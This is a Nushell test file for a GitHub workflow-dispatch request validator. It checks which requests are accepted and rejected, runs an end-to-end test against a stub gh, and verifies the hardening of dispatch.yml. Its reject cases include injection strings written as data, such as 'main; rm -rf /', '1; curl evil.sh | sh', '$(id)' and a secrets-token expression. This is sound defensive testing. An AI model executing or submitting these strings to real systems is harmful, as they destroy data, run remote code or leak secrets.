#!/usr/bin/env nu
# SPDX-License-Identifier: Apache-2.0
# tests/dispatch-request-test.nu — accept/reject matrix for the workflow
# dispatcher (bin/dispatch-request.nu, .github/workflows/dispatch.yml) plus an
# end-to-end `run` against a stub `gh`. Offline; no network, no real gh.

use ../bin/dispatch-request.nu *

let root = ($env.FILE_PWD | path dirname)
let wfdir = ($root | path join ".github" "workflows")
let tmp = (mktemp -d)

# returns "" when accepted, else the error message
def verdict [req: any, dir: string, branches: any = null]: nothing -> string {
    try { validate-request $req $dir --branches $branches; "" } catch {|e| $e.msg }
}

def expect-accept [name: string, req: any, dir: string, branches: any = null]: nothing -> list<string> {
    let v = (verdict $req $dir $branches)
    if $v == "" { [] } else { [$"($name): expected accept, got: ($v)"] }
}

def expect-reject [name: string, needle: string, req: any, dir: string, branches: any = null]: nothing -> list<string> {
    let v = (verdict $req $dir $branches)
    if $v == "" { [$"($name): expected reject, was accepted"] } else if not ($v | str contains "REJECTED") or not ($v | str contains $needle) {
        [$"($name): rejected with unexpected message: ($v)"]
    } else { [] }
}

# ── fixtures ───────────────────────────────────────────────────────────────
# Allowlisted names with controlled inputs, plus edge-case targets.
let fx = ($tmp | path join "wf")
mkdir $fx
"name: t\non:\n  workflow_dispatch:\n    inputs:\n      arch:\n        type: choice\n        options: [amd64, aarch64]\n        default: amd64\n      flag:\n        type: boolean\n        default: false\n      note:\n        default: x\n      run_id:\n        required: true\n      cnt:\n        type: number\n        default: 1\n      env_in:\n        type: environment\njobs: {}\n" | save ($fx | path join "smolfire.yml")
"name: t\non: [push]\njobs: {}\n" | save ($fx | path join "tpm-hosted.yml")
"name: t\non:\n  workflow_dispatch:\njobs: {}\n" | save ($fx | path join "build-image-hosted.yml")

let ok = {workflow: "smolfire.yml", ref: "claude/foo", inputs: {run_id: "123456"}}

mut errs = []

# ── accept ─────────────────────────────────────────────────────────────────
$errs = ($errs | append (expect-accept "minimal" $ok $fx))
$errs = ($errs | append (expect-accept "all types" ($ok | update inputs {run_id: "1", arch: "aarch64", flag: true, note: "a.b-c_d:e/f@1+2=3,4", cnt: 7}) $fx))
$errs = ($errs | append (expect-accept "no-inputs workflow" {workflow: "build-image-hosted.yml", ref: "main"} $fx))
$errs = ($errs | append (expect-accept "watch+timeout" ($ok | merge {watch: true, timeout_minutes: 360}) $fx))
$errs = ($errs | append (expect-accept "known branch" $ok $fx ["main" "claude/foo"]))
let norm = (validate-request ($ok | update inputs {run_id: 5, flag: true}) $fx)
if $norm.inputs != {run_id: "5", flag: "true"} { $errs = ($errs | append $"normalization wrong: ($norm.inputs | to json -r)") }
if (dispatch-body $norm) != '{"ref":"claude/foo","inputs":{"run_id":"5","flag":"true"},"return_run_details":true}' { $errs = ($errs | append $"dispatch-body wrong: (dispatch-body $norm)") }

# ── accept: the REAL workflows in this repo parse and take their real inputs ─
$errs = ($errs | append (expect-accept "real build-image-hosted" {workflow: "build-image-hosted.yml", ref: "main", inputs: {arch: "aarch64", kernel_only: true, kernconf: "SMOLFIRE-VM-TSLOG"}} $wfdir))
$errs = ($errs | append (expect-accept "real smolfire" {workflow: "smolfire.yml", ref: "main", inputs: {tslog: false}} $wfdir))
$errs = ($errs | append (expect-accept "real tpm-hosted" {workflow: "tpm-hosted.yml", ref: "main", inputs: {run_id: "35959282125"}} $wfdir))
$errs = ($errs | append (expect-reject "real tpm-hosted missing run_id" "required input" {workflow: "tpm-hosted.yml", ref: "main"} $wfdir))

# ── reject: workflow ───────────────────────────────────────────────────────
$errs = ($errs | append (expect-reject "unknown workflow" "not allowlisted" ($ok | update workflow "release-image.yml") $fx))
$errs = ($errs | append (expect-reject "dispatcher itself" "not allowlisted" ($ok | update workflow "dispatch.yml") $fx))
$errs = ($errs | append (expect-reject "path traversal workflow" "not allowlisted" ($ok | update workflow "../workflows/smolfire.yml") $fx))
$errs = ($errs | append (expect-reject "workflow w/ suffix" "not allowlisted" ($ok | update workflow "smolfire.yml; id") $fx))
$errs = ($errs | append (expect-reject "workflow not string" "not allowlisted" ($ok | update workflow ["smolfire.yml"]) $fx))
$errs = ($errs | append (expect-reject "non-dispatchable target" "no workflow_dispatch" {workflow: "tpm-hosted.yml", ref: "main"} $fx))
$errs = ($errs | append (expect-reject "target missing at ref" "not found" {workflow: "smolfire.yml", ref: "main"} $tmp))

# ── reject: ref ────────────────────────────────────────────────────────────
for r in [
    ["semicolon" "main; rm -rf /"] ["command subst" 'x$(id)'] ["backtick" 'x`id`'] ["newline" "main\nfoo"]
    ["space" "a b"] ["dotdot" "a/../b"] ["leading dash" "-x"] ["leading slash" "/x"] ["trailing slash" "x/"]
    ["trailing dot" "x."] [".lock" "a/b.lock"] ["hidden comp" "a/.b"] ["full ref" "refs/heads/main"]
    ["empty comp" "a//b"] ["at-brace" "a@{1}"] ["empty" ""] ["quote" "a'b"] ["glob" "claude/*"] ["unicode" "ma\u{0131}n"]
] {
    $errs = ($errs | append (expect-reject $"bad ref ($r.0)" "ref" ($ok | update ref $r.1) $fx))
}
$errs = ($errs | append (expect-reject "ref too long" "ref" ($ok | update ref ("a" | fill -c "a" -w 201)) $fx))
$errs = ($errs | append (expect-reject "ref not string" "ref must be a string" ($ok | update ref 5) $fx))
$errs = ($errs | append (expect-reject "ref not a branch" "not a branch" $ok $fx ["main"]))
$errs = ($errs | append (expect-reject "missing ref" "missing required key 'ref'" {workflow: "smolfire.yml"} $fx))

# ── reject: inputs (injection attempts and schema violations) ──────────────
for v in [
    ["shell semicolon" "1; curl evil.sh | sh"] ["cmd subst" '$(id)'] ["backtick" '`id`'] ["newline" "a\nb=c"]
    ["github expr" '${{ secrets.GITHUB_TOKEN }}'] ["quote" 'a"b'] ["single quote" "a'b"] ["space" "a b"]
    ["pipe" "a|b"] ["amp" "a&b"] ["redirect" "a>b"] ["glob" "a*"] ["backslash" 'a\b'] ["json-in-string" '{"a":1}']
] {
    $errs = ($errs | append (expect-reject $"inj ($v.0)" "disallowed characters" ($ok | update inputs {run_id: "1", note: $v.1}) $fx))
}
$errs = ($errs | append (expect-reject "value too long" "longer than 128" ($ok | update inputs {run_id: "1", note: ("a" | fill -c "a" -w 129)}) $fx))
$errs = ($errs | append (expect-reject "undeclared input" "not declared" ($ok | update inputs {run_id: "1", evil: "1"}) $fx))
$errs = ($errs | append (expect-reject "input key injection" "not declared" ($ok | update inputs {run_id: "1", "a=b\nc": "1"}) $fx))
$errs = ($errs | append (expect-reject "bad choice" "not one of" ($ok | update inputs {run_id: "1", arch: "sparc"}) $fx))
$errs = ($errs | append (expect-reject "bad boolean" "true or false" ($ok | update inputs {run_id: "1", flag: "yes"}) $fx))
$errs = ($errs | append (expect-reject "bad number" "non-negative integer" ($ok | update inputs {run_id: "1", cnt: "1e5"}) $fx))
$errs = ($errs | append (expect-reject "unsupported type" "not supported" ($ok | update inputs {run_id: "1", env_in: "prod"}) $fx))
$errs = ($errs | append (expect-reject "missing required" "required input 'run_id'" {workflow: "smolfire.yml", ref: "main"} $fx))
$errs = ($errs | append (expect-reject "value is object" "must be string/bool/int" ($ok | update inputs {run_id: {a: 1}}) $fx))
$errs = ($errs | append (expect-reject "value is list" "must be string/bool/int" ($ok | update inputs {run_id: ["1"]}) $fx))
$errs = ($errs | append (expect-reject "value null" "must be string/bool/int" ($ok | update inputs {run_id: null}) $fx))
$errs = ($errs | append (expect-reject "inputs not object" "inputs must be an object" ($ok | update inputs ["a"]) $fx))
$errs = ($errs | append (expect-reject "input into no-input workflow" "not declared" {workflow: "build-image-hosted.yml", ref: "main", inputs: {arch: "x"}} $fx))
$errs = ($errs | append (expect-reject "choice on real workflow" "not one of" {workflow: "build-image-hosted.yml", ref: "main", inputs: {arch: "mips"}} $wfdir))

# ── reject: envelope ───────────────────────────────────────────────────────
$errs = ($errs | append (expect-reject "unknown key" "unknown request key" ($ok | insert token "x") $fx))
$errs = ($errs | append (expect-reject "not an object" "must be a JSON object" [1 2] $fx))
$errs = ($errs | append (expect-reject "bad watch" "watch must be" ($ok | insert watch "yes") $fx))
$errs = ($errs | append (expect-reject "timeout 0" "timeout_minutes" ($ok | insert timeout_minutes 0) $fx))
$errs = ($errs | append (expect-reject "timeout huge" "timeout_minutes" ($ok | insert timeout_minutes 361) $fx))
$errs = ($errs | append (expect-reject "bad requested_at" "requested_at" ($ok | insert requested_at "$(id)") $fx))

# ── CLI: new/validate round-trip + rejection exit codes ────────────────────
let nuexe = $nu.current-exe
let script = ($root | path join "bin" "dispatch-request.nu")
let newdir = ($tmp | path join "req")
let n = (do { ^$nuexe $script new --workflow smolfire.yml --ref claude/t --watch --name t1 --workflows-dir $fx --dir $newdir run_id=9 arch=aarch64 } | complete)
if $n.exit_code != 0 { $errs = ($errs | append $"new failed: ($n.stderr)") }
let v = (do { ^$nuexe $script validate ($newdir | path join "t1.json") --workflows-dir $fx } | complete)
if $v.exit_code != 0 { $errs = ($errs | append $"validate of new file failed: ($v.stderr)") }
let nb = (do { ^$nuexe $script new --workflow smolfire.yml --ref claude/t --workflows-dir $fx --dir $newdir "note=a;b" run_id=1 } | complete)
if $nb.exit_code == 0 { $errs = ($errs | append "new accepted an injection value") }
let bad = ($tmp | path join "bad.json")
'{"workflow":"smolfire.yml","ref":"main","inputs":{"run_id":"1"},"extra":1}' | save $bad
let vb = (do { ^$nuexe $script validate $bad --workflows-dir $fx } | complete)
if $vb.exit_code == 0 { $errs = ($errs | append "validate accepted unknown key") }
let vnj = (do { ^$nuexe $script validate $"($tmp)/nonexistent.json" --workflows-dir $fx } | complete)
if $vnj.exit_code == 0 { $errs = ($errs | append "validate accepted missing file") }

# ── end-to-end `run` against a stub gh ─────────────────────────────────────
let stub = ($tmp | path join "gh")
let log = ($tmp | path join "gh.log")
let body = ($tmp | path join "body.json")
let stub_src = "#!/usr/bin/env nu
def --wrapped main [...rest: string] {
    let joined = ($rest | str join ' ')
    $\"($joined)\\n\" | save --append $env.STUB_LOG
    if ($joined | str starts-with 'api repos/o/r/git/ref/heads/') {
        let b = ($rest | get 1 | str replace 'repos/o/r/git/ref/heads/' '')
        if ($b | str contains 'missing') { exit 1 }
        print $\"refs/heads/($b)\"
    } else if ($joined | str starts-with 'api --method POST') {
        if (($env | get -o STUB_API_FAIL | default '0') == '1') { exit 1 }
        cat | save --force $env.STUB_BODY
        let receipt = ($env | get -o STUB_RECEIPT | default '{\"workflow_run_id\":101}')
        if $receipt != 'NO_BODY' { print $receipt }
    } else if ($joined | str starts-with 'run list') {
        if ($rest | any {|a| $a == '-b' }) { print '[{\"databaseId\":101,\"url\":\"https://example.invalid/runs/101\"}]' } else { print '[{\"databaseId\":100}]' }
    } else if ($joined | str starts-with 'run view') {
        let c = ($env | get -o STUB_CONCLUSION | default 'success')
        print $\"{\\\"status\\\":\\\"completed\\\",\\\"conclusion\\\":\\\"($c)\\\"}\"
    } else { exit 2 }
}
"
$stub_src | save $stub
chmod +x $stub
let reqf = ($tmp | path join "r.json")
'{"workflow":"smolfire.yml","ref":"claude/t","inputs":{"run_id":"7","note":"x"},"watch":true,"timeout_minutes":5}' | save $reqf
let envs = {DISPATCH_GH: $stub, STUB_LOG: $log, STUB_BODY: $body, GITHUB_REPOSITORY: "o/r", DISPATCH_WATCH_SECONDS: "0", GITHUB_OUTPUT: ($tmp | path join "out.txt")}
let r1 = (with-env ($envs | insert GITHUB_REF "refs/heads/claude/source-a") { do { ^$nuexe $script run --file $reqf --workflows-dir $fx } | complete })
if $r1.exit_code != 0 { $errs = ($errs | append $"stub run failed: ($r1.stdout) ($r1.stderr)") }
if not ($r1.stdout | str contains "https://github.com/o/r/actions/runs/101") { $errs = ($errs | append "run URL not printed") }
if not ($body | path exists) or (open --raw $body) != '{"ref":"claude/t","inputs":{"run_id":"7","note":"x"},"return_run_details":true}' { $errs = ($errs | append $"dispatch body wrong: (open --raw $body)") }
if ((open --raw $log | lines | where {|l| $l | str starts-with "run list" } | length) > 0) { $errs = ($errs | append "run ID must come from dispatch receipt, not a run-list heuristic") }
let a_views = (open --raw $log | lines | where {|l| $l | str starts-with "run view" })
if ($a_views | length) != 1 or not ($a_views | any {|l| $l | str contains "run view 101 " }) { $errs = ($errs | append "source-a watched a run other than its receipt ID 101") }
let r2 = (with-env ($envs | insert STUB_CONCLUSION "failure") { do { ^$nuexe $script run --file $reqf --workflows-dir $fx } | complete })
if $r2.exit_code == 0 { $errs = ($errs | append "watch of failed run should exit non-zero") }
rm -f $log
let source_b = (with-env ($envs | merge {GITHUB_REF: "refs/heads/claude/source-b", STUB_RECEIPT: '{"workflow_run_id":102}'}) { do { ^$nuexe $script run --file $reqf --workflows-dir $fx } | complete })
if $source_b.exit_code != 0 { $errs = ($errs | append $"source-b dispatch failed: ($source_b.stderr)") }
if not ($source_b.stdout | str contains "https://github.com/o/r/actions/runs/102") { $errs = ($errs | append "source-b did not report its own receipt ID 102") }
let b_views = (open --raw $log | lines | where {|l| $l | str starts-with "run view" })
if ($b_views | length) != 1 or not ($b_views | any {|l| $l | str contains "run view 102 " }) { $errs = ($errs | append "source-b watched a run other than its receipt ID 102") }
for c in [
    {name: "empty", response: "NO_BODY"}
    {name: "missing", response: "{}"}
    {name: "malformed", response: "{"}
    {name: "null-body", response: "null"}
    {name: "null-id", response: '{"workflow_run_id":null}'}
    {name: "float", response: '{"workflow_run_id":101.9}'}
    {name: "string", response: '{"workflow_run_id":"101"}'}
    {name: "boolean", response: '{"workflow_run_id":true}'}
    {name: "zero", response: '{"workflow_run_id":0}'}
    {name: "negative", response: '{"workflow_run_id":-1}'}
] {
    rm -f $log
    let out_before = (open --raw $envs.GITHUB_OUTPUT)
    let bad = (with-env ($envs | insert STUB_RECEIPT $c.response) { do { ^$nuexe $script run --file $reqf --workflows-dir $fx } | complete })
    if $bad.exit_code == 0 { $errs = ($errs | append $"($c.name) receipt was accepted") }
    if ($bad.stdout | str contains "Run URL:") { $errs = ($errs | append $"($c.name) receipt produced a run URL") }
    if (open --raw $envs.GITHUB_OUTPUT) != $out_before { $errs = ($errs | append $"($c.name) receipt wrote GITHUB_OUTPUT") }
    if ((open --raw $log | lines | where {|l| $l | str starts-with "run view" } | length) > 0) { $errs = ($errs | append $"($c.name) receipt watched a run") }
}
rm -f $log
let out_before = (open --raw $envs.GITHUB_OUTPUT)
let api_fail = (with-env ($envs | insert STUB_API_FAIL "1") { do { ^$nuexe $script run --file $reqf --workflows-dir $fx } | complete })
if $api_fail.exit_code == 0 { $errs = ($errs | append "failed dispatch API was accepted") }
if (open --raw $envs.GITHUB_OUTPUT) != $out_before { $errs = ($errs | append "failed dispatch API wrote GITHUB_OUTPUT") }
'{"workflow":"smolfire.yml","ref":"claude/missing","inputs":{"run_id":"7"}}' | save --force $reqf
rm -f $log
let r3 = (with-env $envs { do { ^$nuexe $script run --file $reqf --workflows-dir $fx } | complete })
if $r3.exit_code == 0 { $errs = ($errs | append "nonexistent branch should be rejected") }
if ((open --raw $log | lines | where {|l| $l | str contains "--method POST" } | length) > 0) { $errs = ($errs | append "POST issued despite missing branch") }

# ── `prepare` (push event): exactly one request file in the head commit ─────
let pushed = ($tmp | path join "pushed")
mkdir ($pushed | path join ".github" "dispatch")
^git -C $pushed init -q
^git -C $pushed config user.email t@example.invalid
^git -C $pushed config user.name t
"x" | save ($pushed | path join "a.txt")
^git -C $pushed add -A
^git -C $pushed commit -q -m base
'{"workflow":"smolfire.yml","ref":"claude/t","inputs":{"run_id":"7"}}' | save ($pushed | path join ".github" "dispatch" "one.json")
^git -C $pushed add -A
^git -C $pushed commit -q -m req
let penv = ($envs | merge {DISPATCH_EVENT: "push"})
let outj = ($tmp | path join "prepared.json")
let p1 = (with-env $penv { do { ^$nuexe $script prepare --pushed-dir $pushed --out $outj } | complete })
if $p1.exit_code != 0 { $errs = ($errs | append $"prepare failed: ($p1.stderr)") }
if not ($outj | path exists) or (open $outj | get ref) != "claude/t" { $errs = ($errs | append "prepare did not write the request") }
if not ((open --raw ($tmp | path join "out.txt")) | str contains "ref=claude/t") { $errs = ($errs | append "prepare did not emit ref output") }
'{"workflow":"smolfire.yml","ref":"claude/t"}' | save ($pushed | path join ".github" "dispatch" "two.json")
'{"workflow":"smolfire.yml","ref":"claude/t"}' | save --force ($pushed | path join ".github" "dispatch" "one.json")
^git -C $pushed add -A
^git -C $pushed commit -q -m two
let p2 = (with-env $penv { do { ^$nuexe $script prepare --pushed-dir $pushed --out $outj } | complete })
if $p2.exit_code == 0 { $errs = ($errs | append "prepare accepted two request files in one push") }
let p3 = (with-env ($penv | update DISPATCH_EVENT "workflow_dispatch" | insert REQUEST_JSON '{"workflow":"smolfire.yml","ref":"claude/missing"}') { do { ^$nuexe $script prepare --pushed-dir $pushed --out $outj } | complete })
if $p3.exit_code == 0 { $errs = ($errs | append "prepare accepted nonexistent branch via workflow_dispatch") }
let p4 = (with-env ($penv | update DISPATCH_EVENT "workflow_dispatch" | insert REQUEST_JSON '{"workflow":"smolfire.yml","ref":"x; id"}') { do { ^$nuexe $script prepare --pushed-dir $pushed --out $outj } | complete })
if $p4.exit_code == 0 { $errs = ($errs | append "prepare accepted malformed ref") }

# ── dispatch.yml hardening invariants ──────────────────────────────────────
let dy = (open --raw ($wfdir | path join "dispatch.yml") | from yaml)
if $dy.permissions != {actions: "write", contents: "read"} { $errs = ($errs | append $"dispatch.yml permissions must be exactly actions:write + contents:read, got ($dy.permissions | to json -r)") }
let runs = ($dy.jobs.dispatch.steps | where {|s| "run" in ($s | columns) } | get run)
for r in $runs {
    if ($r | str contains '${{') { $errs = ($errs | append "dispatch.yml run: block interpolates ${{ }} into shell") }
}
if (($dy.jobs | columns) != ["dispatch"]) { $errs = ($errs | append "dispatch.yml must have exactly one job") }
let trig = ($dy | get on)
if $trig.push.branches != ["claude/**"] or $trig.push.paths != [".github/dispatch/*.json"] { $errs = ($errs | append "dispatch.yml push trigger must be claude/** + .github/dispatch/*.json only") }
let first = ($dy.jobs.dispatch.steps | first)
if $first.with.path != "trusted" or not ($first.with.ref | str contains "default_branch") { $errs = ($errs | append "validator must be checked out from the default branch") }
for s in ($dy.jobs.dispatch.steps | where {|s| "run" in ($s | columns) and ($s.run | str contains "dispatch-request.nu") }) {
    if not ($s.run | str contains "trusted/bin/dispatch-request.nu") { $errs = ($errs | append "validator invoked from outside trusted/") }
}

rm -rf $tmp
if ($errs | is-empty) {
    print "dispatch-request-test: PASS"
} else {
    for e in $errs { print $"  FAIL: ($e)" }
    print $"dispatch-request-test: FAIL (($errs | length))"
    exit 1
}
